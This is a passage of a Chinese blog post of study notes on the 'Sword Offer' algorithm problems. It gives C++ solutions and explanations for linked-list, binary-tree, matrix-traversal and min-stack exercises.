fast-&gt;next;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">        slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">          fast = fast-&gt;next;</span><br><span class="line">          slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-使用哈希表或者set">法2 使用哈希表或者set</h3><p>与“快慢指针扫描法”相比，空间复杂度会高一些</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">entryNodeOfLoop</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;ListNode*&gt; us;</span><br><span class="line">    <span class="keyword">auto</span> p = head;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!us.<span class="built_in">count</span>(p)) &#123;</span><br><span class="line">        us.<span class="built_in">insert</span>(p);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-3">Week 3</h1><h2 id="反转链表★"><a href="https://www.acwing.com/problem/content/33/">反转链表★</a></h2><p>定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。</p><p><strong>思考题：</strong></p><ul><li>请同时实现迭代版本和递归版本。</li></ul><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,30]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出:5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</code></pre><h3 id="法1-迭代法">法1 迭代法</h3><p>翻转即将所有节点的next指针指向前驱节点。<br>由于是单链表，我们在迭代时不能直接找到前驱节点，所以我们需要一个额外的指针保存前驱节点。同时在改变当前节点的next指针前，不要忘记保存它的后继节点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *cur = head, *prev = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      ListNode *next = cur-&gt;next;</span><br><span class="line">      cur-&gt;next = prev;</span><br><span class="line">      prev = cur, cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-递归法">法2 递归法</h3><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221216181625909.png" alt="image-20221216181625909"></p><p>首先我们先考虑 <code>reverseList()</code> 函数能做什么，它可以翻转一个链表，并返回新链表的头节点，也就是原链表的尾节点。<br>所以我们可以先递归处理 <code>reverseList(head-&gt;next)</code>，这样我们可以将以``head-&gt;next`为头节点的链表翻转，此时head-&gt;next是新链表的尾节点，我们令它的next指针指向head，并将head-&gt;next指向空即可将整个链表翻转。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode *new_head = <span class="built_in">reverseList</span>(head-&gt;next);</span><br><span class="line">    head-&gt;next-&gt;next = head;</span><br><span class="line">    head-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> new_head;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="合并两个排序的链表"><a href="https://www.acwing.com/problem/content/34/">合并两个排序的链表</a></h2><p>输入两个递增排序的链表，合并这两个链表并使新链表中的结点仍然是按照递增排序的。</p><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：1-&gt;3-&gt;5 , 2-&gt;4-&gt;5输出：1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;5</code></pre><h3 id="题解-3">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">    ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), *cur = dummy;</span><br><span class="line">    <span class="keyword">while</span> (l1 &amp;&amp; l2) &#123;</span><br><span class="line">      <span class="keyword">if</span> (l1-&gt;val &lt;= l2-&gt;val) &#123;</span><br><span class="line">        cur-&gt;next = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cur-&gt;next = l2;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;  <span class="comment">// cur也要移动</span></span><br><span class="line">    &#125;</span><br><span class="line">    cur-&gt;next = (l1? l1: l2);</span><br><span class="line">    <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="树的子结构"><a href="https://www.acwing.com/problem/content/35/">树的子结构</a></h2><p>输入两棵二叉树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mtext>，</mtext><mi>B</mi></mrow><annotation encoding="application/x-tex">A，B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，判断 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 是不是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的子结构。</p><p>我们规定空树不是任何树的子结构。</p><p><strong>数据范围</strong></p><p>每棵树的节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><p>树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>：</p><pre><code>     8    / \   8   7  / \ 9   2    / \   4   7</code></pre><p>树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>：</p><pre><code>   8  / \ 9   2</code></pre><p>返回 <strong>true</strong>，因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的子结构。</p><h3 id="递归法">递归法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">hasSubtree</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pRoot2为空不是任何树的子结构, pRoot1为空为终止条件</span></span><br><span class="line">    <span class="keyword">if</span> (!pRoot1 || !pRoot2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dfs</span>(pRoot1, pRoot2)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hasSubtree</span>(pRoot1-&gt;left, pRoot2) || <span class="built_in">hasSubtree</span>(pRoot1-&gt;right, pRoot2);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode *pRoot1, TreeNode *pRoot2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pRoot2) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!pRoot1 || pRoot1-&gt;val != pRoot2-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(pRoot1-&gt;left, pRoot2-&gt;left) &amp;&amp; <span class="built_in">dfs</span>(pRoot1-&gt;right, pRoot2-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>dfs</code> 不能写下面这个函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsSame</span><span class="params">(TreeNode *A, TreeNode *B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!A || !B) <span class="keyword">return</span> !A &amp;&amp; !B;</span><br><span class="line">  <span class="keyword">return</span> A-&gt;val == B-&gt;val &amp;&amp; <span class="built_in">IsSame</span>(A-&gt;left, B-&gt;left) &amp;&amp; <span class="built_in">IsSame</span>(A-&gt;right, B-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为从本题给出的例子看出 <strong>“子结构”</strong> 并非要求完全一致（A树中的2还有两个儿子，而B树中2为叶子节点）。</p></blockquote><h2 id="二叉树的镜像"><a href="https://www.acwing.com/problem/content/37/">二叉树的镜像</a></h2><p>输入一个二叉树，将它变换为它的镜像。</p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入树：      8     / \    6  10   / \ / \  5  7 9 11 [8,6,10,5,7,9,11,null,null,null,null,null,null,null,null] 输出树：      8     / \    10  6   / \ / \  11 9 7  5 [8,10,6,11,9,7,5,null,null,null,null,null,null,null,null]</code></pre><h3 id="递归法-2">递归法</h3><p>递归遍历原树的所有节点，将每个节点的左右儿子互换即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mirror</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">mirror</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">mirror</span>(root-&gt;right);</span><br><span class="line">    <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="对称的二叉树"><a href="https://www.acwing.com/problem/content/38/">对称的二叉树</a></h2><p>请实现一个函数，用来判断一棵二叉树是不是对称的。</p><p>如果一棵二叉树和它的镜像一样，那么它是对称的。</p><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>如下图所示二叉树[1,2,2,3,4,4,3,null,null,null,null,null,null,null,null]为对称二叉树：    1   / \  2   2 / \ / \3  4 4  3如下图所示二叉树[1,2,2,null,4,4,3,null,null,null,null,null,null]不是对称二叉树：    1   / \  2   2   \ / \   4 4  3</code></pre><h3 id="递归法-3">递归法</h3><p>两个子树互为镜像当且仅当：</p><ol><li>两个子树的根节点值相等；</li><li>第一棵子的左子树和第二棵子树的右子树互为镜像，且第一棵子树的右子树和第二棵子树的左子树互为镜像；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode *p, TreeNode *q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p || !q) <span class="keyword">return</span> !p &amp;&amp; !q;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;val == q-&gt;val &amp;&amp; <span class="built_in">dfs</span>(p-&gt;left, q-&gt;right) &amp;&amp; <span class="built_in">dfs</span>(p-&gt;right, q-&gt;left);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="顺时针打印矩阵★"><a href="https://www.acwing.com/problem/content/39/">顺时针打印矩阵★</a></h2><p>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字。</p><p><strong>数据范围</strong></p><p>矩阵中元素数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>400</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,400]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">400</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[  [1, 2, 3, 4],  [5, 6, 7, 8],  [9,10,11,12]]输出：[1,2,3,4,8,12,11,10,9,5,6,7]</code></pre><h3 id="模拟法">模拟法</h3><p>走到头，或者走到已经走过的地方就掉头。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; matrix)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">empty</span>()) <span class="keyword">return</span> res;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> n = matrix.<span class="built_in">size</span>(), m = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(m, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">1</span>, a, b;</span><br><span class="line">    <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n * m; i++) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(matrix[x][y]);</span><br><span class="line">      st[x][y] = <span class="literal">true</span>;</span><br><span class="line">      </span><br><span class="line">      a = x + dx[d], b = y + dy[d];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= n || a &lt; <span class="number">0</span> || b &gt;= m || b &lt; <span class="number">0</span> || st[a][b]) &#123;  <span class="comment">// st[a][b]必须放最后, 否则可能访问出界</span></span><br><span class="line">        d = (d + <span class="number">1</span>) % <span class="number">4</span>;</span><br><span class="line">        a = x + dx[d], b = y + dy[d];</span><br><span class="line">      &#125;</span><br><span class="line">      x = a, y = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="包含min函数的栈★"><a href="https://www.acwing.com/problem/content/90/">包含min函数的栈★</a></h2><p>设计一个支持push，pop，top等操作并且可以在O(1)时间内检索出最小元素的堆栈。</p><ul><li>push(x)–将元素x插入栈中</li><li>pop()–移除栈顶元素</li><li>top()–得到栈顶元素</li><li>getMin()–得到栈中最小元素</li></ul><p><strong>数据范围</strong></p><p>操作命令总数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>MinStack minStack = new MinStack();minStack.push(-1);minStack.push(3);minStack.push(-4);minStack.getMin();   --&gt; Returns -4.minStack.pop();minStack.top();      --&gt; Returns 3.minStack.getMin();   --&gt; Returns -1.</code></pre><h3 id="辅助栈">辅助栈</h3><p>我们除了维护基本的栈结构之外，还需要维护一个单调栈，来实现返回最小值的操作。<br>下面介绍如何维护单调栈：</p><ul><li>当我们向栈中压入一个数时，如果该数 ≤≤ 